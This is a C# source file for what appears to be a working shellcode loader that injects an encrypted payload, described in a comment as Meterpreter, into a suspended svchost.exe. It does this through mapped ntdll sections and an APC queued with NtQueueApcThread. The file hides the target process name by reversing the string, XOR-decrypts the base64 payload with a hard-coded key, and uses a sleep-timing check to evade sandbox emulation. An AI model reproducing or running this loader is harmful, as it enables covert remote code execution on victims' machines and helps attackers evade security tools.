using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace Process_Injection___APC__ntdll__Decrypter
{
    class apc
    {
        public const uint CREATE_SUSPENDED = 0x4;

        [Flags]
        public enum ACCESS_MASK : uint
        {
            DELETE = 0x00010000,
            READ_CONTROL = 0x00020000,
            WRITE_DAC = 0x00040000,
            WRITE_OWNER = 0x00080000,
            SYNCHRONIZE = 0x00100000,

            STANDARD_RIGHTS_REQUIRED = 0x000F0000,

            STANDARD_RIGHTS_READ = 0x00020000,
            STANDARD_RIGHTS_WRITE = 0x00020000,
            STANDARD_RIGHTS_EXECUTE = 0x00020000,

            STANDARD_RIGHTS_ALL = 0x001F0000,

            SPECIFIC_RIGHTS_ALL = 0x0000FFFF,

            ACCESS_SYSTEM_SECURITY = 0x01000000,

            MAXIMUM_ALLOWED = 0x02000000,

            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000,
            GENERIC_EXECUTE = 0x20000000,
            GENERIC_ALL = 0x10000000,

            DESKTOP_READOBJECTS = 0x00000001,
            DESKTOP_CREATEWINDOW = 0x00000002,
            DESKTOP_CREATEMENU = 0x00000004,
            DESKTOP_HOOKCONTROL = 0x00000008,
            DESKTOP_JOURNALRECORD = 0x00000010,
            DESKTOP_JOURNALPLAYBACK = 0x00000020,
            DESKTOP_ENUMERATE = 0x00000040,
            DESKTOP_WRITEOBJECTS = 0x00000080,
            DESKTOP_SWITCHDESKTOP = 0x00000100,

            WINSTA_ENUMDESKTOPS = 0x00000001,
            WINSTA_READATTRIBUTES = 0x00000002,
            WINSTA_ACCESSCLIPBOARD = 0x00000004,
            WINSTA_CREATEDESKTOP = 0x00000008,
            WINSTA_WRITEATTRIBUTES = 0x00000010,
            WINSTA_ACCESSGLOBALATOMS = 0x00000020,
            WINSTA_EXITWINDOWS = 0x00000040,
            WINSTA_ENUMERATE = 0x00000100,
            WINSTA_READSCREEN = 0x00000200,

            WINSTA_ALL_ACCESS = 0x0000037F
        }





        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION
        lpProcessInformation);

        /*
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 NtCreateUserProcess(
            ref IntPtr ProcessHandle, 
            ref IntPtr ThreadHandle,
            ACCESS_MASK ProcessDesiredAccess,
            ACCESS_MASK ThreadDesiredAccess, 
            IntPtr ProcessObjectAttributes, 
            IntPtr ThreadObjectAttributes, 
            UInt32 ProcessFlags, 
            UInt32 ThreadFlags, 
            IntPtr ProcessParameters, 
            ref PS_CREATE_INFO CreateInfo, 
            ref PS_ATTRIBUTE_LIST AttributeList);

        */

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);


        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        Int32 nSize,
        out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);


        [DllImport("ntdll.dll")]
        public static extern IntPtr NtQueueApcThread(IntPtr hThread, IntPtr pfnAPC, IntPtr dwData1, IntPtr dwData2, IntPtr dwData3);


        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();


        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(
           ref IntPtr section,
           UInt32 desiredAccess,
           IntPtr pAttrs,
           ref long MaxSize,
           uint pageProt,
           uint allocationAttribs,
           IntPtr hFile);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(
            IntPtr hProc,
            IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {
            string obfuscatedstringname = "exe.tsohcvs\\23metsyS\\swodniW\\:C";
            string stringname = "";
            //byte[] buf = new byte[610] {
            //   0x03, 0xb7, 0x7c, 0x1b, 0x0f, 0x17, 0x33, 0xff, 0xff, 0xff, 0xbe, 0xae, 0xbe, 0xaf, 0xad, 0xb7, 0xce, 0x2d, 0xae, 0x9a, 0xb7, 0x74, 0xad, 0x9f, 0xb7, 0x74, 0xad, 0xe7, 0xb7, 0x74, 0xad, 0xdf, 0xa9, 0xb7, 0xf0, 0x48, 0xb5, 0xb5, 0xb2, 0xce, 0x36, 0xb7, 0x74, 0x8d, 0xaf, 0xb7, 0xce, 0x3f, 0x53, 0xc3, 0x9e, 0x83, 0xfd, 0xd3, 0xdf, 0xbe, 0x3e, 0x36, 0xf2, 0xbe, 0xfe, 0x3e, 0x1d, 0x12, 0xad, 0xb7, 0x74, 0xad, 0xdf, 0x74, 0xbd, 0xc3, 0xbe, 0xae, 0xb7, 0xfe, 0x2f, 0x99, 0x7e, 0x87, 0xe7, 0xf4, 0xfd, 0xf0, 0x7a, 0x8d, 0xff, 0xff, 0xff, 0x74, 0x7f, 0x77, 0xff, 0xff, 0xff, 0xb7, 0x7a, 0x3f, 0x8b, 0x98, 0xb7, 0xfe, 0x2f, 0xbb, 0x74, 0xbf, 0xdf, 0xaf, 0x74, 0xb7, 0xe7, 0xb6, 0xfe, 0x2f, 0x1c, 0xa9, 0xb2, 0xce, 0x36, 0xb7, 0x00, 0x36, 0xbe, 0x74, 0xcb, 0x77, 0xb7, 0xfe, 0x29, 0xb7, 0xce, 0x3f, 0xbe, 0x3e, 0x36, 0xf2, 0x53, 0xbe, 0xfe, 0x3e, 0xc7, 0x1f, 0x8a, 0x0e, 0xb3, 0xfc, 0xb3, 0xdb, 0xf7, 0xba, 0xc6, 0x2e, 0x8a, 0x27, 0xa7, 0xbb, 0x74, 0xbf, 0xdb, 0xb6, 0xfe, 0x2f, 0x99, 0xbe, 0x74, 0xf3, 0xb7, 0xbb, 0x74, 0xbf, 0xe3, 0xb6, 0xfe, 0x2f, 0xbe, 0x74, 0xfb, 0x77, 0xb7, 0xfe, 0x2f, 0xbe, 0xa7, 0xbe, 0xa7, 0xa1, 0xa6, 0xa5, 0xbe, 0xa7, 0xbe, 0xa6, 0xbe, 0xa5, 0xb7, 0x7c, 0x13, 0xdf, 0xbe, 0xad, 0x00, 0x1f, 0xa7, 0xbe, 0xa6, 0xa5, 0xb7, 0x74, 0xed, 0x16, 0xb4, 0x00, 0x00, 0x00, 0xa2, 0xb7, 0xce, 0x24, 0xac, 0xb6, 0x41, 0x88, 0x96, 0x91, 0x96, 0x91, 0x9a, 0x8b, 0xff, 0xbe, 0xa9, 0xb7, 0x76, 0x1e, 0xb6, 0x38, 0x3d, 0xb3, 0x88, 0xd9, 0xf8, 0x00, 0x2a, 0xac, 0xac, 0xb7, 0x76, 0x1e, 0xac, 0xa5, 0xb2, 0xce, 0x3f, 0xb2, 0xce, 0x36, 0xac, 0xac, 0xb6, 0x45, 0xc5, 0xa9, 0x86, 0x58, 0xff, 0xff, 0xff, 0xff, 0x00, 0x2a, 0x17, 0xf1, 0xff, 0xff, 0xff, 0xce, 0xc6, 0xcd, 0xd1, 0xce, 0xc9, 0xc7, 0xd1, 0xce, 0xd1, 0xce, 0xc9, 0xc9, 0xff, 0xa5, 0xb7, 0x76, 0x3e, 0xb6, 0x38, 0x3f, 0x44, 0xfe, 0xff, 0xff, 0xb2, 0xce, 0x36, 0xac, 0xac, 0x95, 0xfc, 0xac, 0xb6, 0x45, 0xa8, 0x76, 0x60, 0x39, 0xff, 0xff, 0xff, 0xff, 0x00, 0x2a, 0x17, 0xc7, 0xff, 0xff, 0xff, 0xd0, 0x8e, 0xb5, 0x8f, 0xaa, 0x9e, 0x93, 0xcc, 0x9a, 0xca, 0xca, 0x92, 0xc9, 0x9d, 0xc8, 0x8b, 0x8b, 0xcd, 0xb1, 0x96, 0xa7, 0xcc, 0x98, 0x97, 0xb2, 0xb7, 0xaa, 0x87, 0xb3, 0xa9, 0xc8, 0xb9, 0xa6, 0x85, 0xa0, 0xbe, 0x99, 0xb3, 0x89, 0xb7, 0x87, 0xa0, 0xad, 0x94, 0x86, 0x98, 0xb3, 0xaa, 0xbd, 0xc9, 0xb8, 0xa8, 0xb6, 0x87, 0xa9, 0xff, 0xb7, 0x76, 0x3e, 0xac, 0xa5, 0xbe, 0xa7, 0xb2, 0xce, 0x36, 0xac, 0xb7, 0x47, 0xff, 0xcd, 0x57, 0x7b, 0xff, 0xff, 0xff, 0xff, 0xaf, 0xac, 0xac, 0xb6, 0x38, 0x3d, 0x14, 0xaa, 0xd1, 0xc4, 0x00, 0x2a, 0xb7, 0x76, 0x39, 0x95, 0xf5, 0xa0, 0xb7, 0x76, 0x0e, 0x95, 0xe0, 0xa5, 0xad, 0x97, 0x7f, 0xcc, 0xff, 0xff, 0xb6, 0x76, 0x1f, 0x95, 0xfb, 0xbe, 0xa6, 0xb6, 0x45, 0x8a, 0xb9, 0x61, 0x79, 0xff, 0xff, 0xff, 0xff, 0x00, 0x2a, 0xb2, 0xce, 0x3f, 0xac, 0xa5, 0xb7, 0x76, 0x0e, 0xb2, 0xce, 0x36, 0xb2, 0xce, 0x36, 0xac, 0xac, 0xb6, 0x38, 0x3d, 0xd2, 0xf9, 0xe7, 0x84, 0x00, 0x2a, 0x7a, 0x3f, 0x8a, 0xe0, 0xb7, 0x38, 0x3e, 0x77, 0xec, 0xff, 0xff, 0xb6, 0x45, 0xbb, 0x0f, 0xca, 0x1f, 0xff, 0xff, 0xff, 0xff, 0x00, 0x2a, 0xb7, 0x00, 0x30, 0x8b, 0xfd, 0x14, 0x55, 0x17, 0xaa, 0xff, 0xff, 0xff, 0xac, 0xa6, 0x95, 0xbf, 0xa5, 0xb6, 0x76, 0x2e, 0x3e, 0x1d, 0xef, 0xb6, 0x38, 0x3f, 0xff, 0xef, 0xff, 0xff, 0xb6, 0x45, 0xa7, 0x5b, 0xac, 0x1a, 0xff, 0xff, 0xff, 0xff, 0x00, 0x2a, 0xb7, 0x6c, 0xac, 0xac, 0xb7, 0x76, 0x18, 0xb7, 0x76, 0x0e, 0xb7, 0x76, 0x25, 0xb6, 0x38, 0x3f, 0xff, 0xdf, 0xff, 0xff, 0xb6, 0x76, 0x06, 0xb6, 0x45, 0xed, 0x69, 0x76, 0x1d, 0xff, 0xff, 0xff, 0xff, 0x00, 0x2a, 0xb7, 0x7c, 0x3b, 0xdf, 0x7a, 0x3f, 0x8b, 0x4d, 0x99, 0x74, 0xf8, 0xb7, 0xfe, 0x3c, 0x7a, 0x3f, 0x8a, 0x2d, 0xa7, 0x3c, 0xa7, 0x95, 0xff, 0xa6, 0x44, 0x1f, 0xe2, 0xd5, 0xf5, 0xbe, 0x76, 0x25, 0x00, 0x2a};

            string base64Encoded = "rz3z14K7/2NyMzVwEiUiYjpi4TUXe/9zMz37YWobuDFSfkXoG3rHeTgbuBEie0Xh/0kRT3B/EyKz+nlgUrSS3iAbuDFSuDYdEiQ4MqI1shtqOHYu1gdwM3LYs+tyM3Rp1rUEVDpS4+g6KyRl2DVQenOD0DU6zL1g2EH4fkOae2Kke0Xh/zSx+n8SMqJK0wHQH3Y8F3oWCrIH6yxl2DVUenODVSL5Pzxl2DVsenODcuh2uzwggzQocioNajkzazV4Ei84sJ5zcjGN0yxgCi84uGC6eJyNzClpYq4jeswkWg0bXRFVUzQme/uyeqSwfwMHVIqlYCEbuoIhaTkQkzhB+iEAetlIZQ2GU3VwM42G221yM3QQakdeAkRrHVJcAkIXUy84urMa9KPJMnQhHkS5YCE5MDA7iSOozLNwM3JTzLaaQnQhU1pBRENjQSgqdh5JPxYoAkM3YzweeSRWOiw3HkVnWhcgRztlIy0GACAEV1IlfjlCKgEhSjwdBSw5XS57PzwAeRsqYg8QSx5COUIFCwM2XTkCUjZzA0RCAR4XazwqXRpIakUqZRkrAgwiAjxnEkdHQEpTe+qzYC5gCzhB+iEbi2NAm/AhU3VwYyEAeqSw2CEPaIqle/uVWWkte/3QOWoqYRrTAGNyev3BOXExajvpRiXstXQhU3WP5j9i8zAoe/3QHkS5fkOaYDA79LYMVW0LzKfW8xZte7Pg22ZwMzvpd5NH03QhU3WP5jqs/Bdw2N7JBnVwMyEKWSMoev3wkpdgerWTM3NyMz2bC9Ej1nJTM2ON5jyyACY4upUbupI6uq5olLVwE3JTeuqLes4zxfySM3JTM5yne/flc/CwR8A1uGQ6MrekkwCia7ELWWMriJQ8eX8xuqis5g==";

            /* EVASION 1: Sleep to evade emulation */
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            //byte key = 0xFF; // good key
            string key = "Sup3rS3cr3t!";


            byte[] buf = System.Convert.FromBase64String(base64Encoded);


            if (t2 < 2)
            {
                key = "NowayNoway!"; // wrong key
            }

            if (key == "NowayNoway!")
            {
                Sleep(1000);
            }
            else
            {
                /* Meterpreter decryption */
                Console.WriteLine("[+] Decrypting the shellcode");
                for (int i = 0; i < buf.Length; i++)
                {
                    //buf[i] = (byte)(((uint)buf[i] ^ key) & 0xFF);
                    buf[i] = (byte)(((uint)buf[i] ^ key[i % key.Length]) & 0xFF);
                }

                //Deobfusate host process name
                for (int i = 0; i < obfuscatedstringname.Length; i++)
                {
                    stringname = stringname + obfuscatedstringname[obfuscatedstringname.Length - i - 1];
                }
                Console.WriteLine("[+] Deobfuscated the host process name: " + stringname);

                // Create the section handle.
                IntPtr ptr_section_handle = IntPtr.Zero;
                long buffer_size = buf.Length;
                UInt32 SECTION_MAP_WRITE = 0x0002;
                UInt32 SECTION_MAP_READ = 0x0004;
                UInt32 SECTION_MAP_EXECUTE = 0x0008;
                UInt32 SECTION_ALL_ACCESS = SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE;
                uint PAGE_EXECUTE_READWRITE = 0x40;
                uint SEC_COMMIT = 0x08000000;



                //UInt32 THREAD_CREATE_FLAGS_CREATE_SUSPENDED = 0x00000001;
                //UInt32 PROCESS_ALL_ACCESS = 0x1FFFFF;
                //UInt32 THREAD_ALL_ACCESS = 0x1FFFFF;



                UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, SECTION_ALL_ACCESS, IntPtr.Zero, ref buffer_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
                if (create_section_status != 0 || ptr_section_handle == IntPtr.Zero)
                {
                    Console.WriteLine("[-] An error occured while creating the section.");
                    return;
                }
                Console.WriteLine("[+] The section has been created successfully.");
                Console.WriteLine("[*] ptr_section_handle: 0x" + String.Format("{0:X}", (ptr_section_handle).ToInt64()));


                // Map a view of a section into the virtual address space of the current process.
                long local_section_offset = 0;
                uint PAGE_READWRITE = 0x4;
                IntPtr ptr_local_section_addr = IntPtr.Zero;
                UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, GetCurrentProcess(), ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, PAGE_READWRITE);
                if (local_map_view_status != 0 || ptr_local_section_addr == IntPtr.Zero)
                {
                    Console.WriteLine("[-] An error occured while mapping the view within the local section.");
                    return;
                }
                Console.WriteLine("[+] The local section view's been mapped successfully with PAGE_READWRITE access.");
                Console.WriteLine("[*] ptr_local_section_addr: 0x" + String.Format("{0:X}", (ptr_local_section_addr).ToInt64()));

                // Copy the shellcode into the mapped section.
                Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);



                //Run host process
                STARTUPINFO si = new STARTUPINFO();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                bool res = CreateProcess(null, stringname, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
                /*
                IntPtr hProcess = IntPtr.Zero;
                IntPtr hThread = IntPtr.Zero;
                UInt32 res = NtCreateUserProcess(hProcess,  hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, IntPtr.Zero, IntPtr.Zero, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, &userParams, &procInfo, &attrList);
                */

                if (res == false)
                {
                    Console.WriteLine("CreateProcess failed");
                    return;
                }
                Console.WriteLine("[*] Created process ID: " + pi.dwProcessId);
                Console.WriteLine("[*] Created Thread ID: " + pi.dwThreadId);

                IntPtr ptr_remote_section_addr = IntPtr.Zero;
                uint PAGE_EXECUTE_READ = 0x20;
                UInt32 remote_map_view_status = NtMapViewOfSection(ptr_section_handle, pi.hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, PAGE_EXECUTE_READ);
                if (remote_map_view_status != 0 || ptr_remote_section_addr == IntPtr.Zero)
                {
                    Console.WriteLine("[-] An error occured while mapping the view within the remote section.");
                    return;
                }
                Console.WriteLine("[+] The remote section view's been mapped successfully with PAGE_EXECUTE_READ access.");
                Console.WriteLine("[*] ptr_remote_section_addr: 0x" + String.Format("{0:X}", (ptr_remote_section_addr).ToInt64()));


                //            QueueUserAPC(ptr_remote_section_addr, pi.hThread, IntPtr.Zero);
                NtQueueApcThread(pi.hThread, ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);


                // Resume thread
                Console.WriteLine("[+] Resuming Thread...");
                ResumeThread(pi.hThread);
            }
        }
    }
}
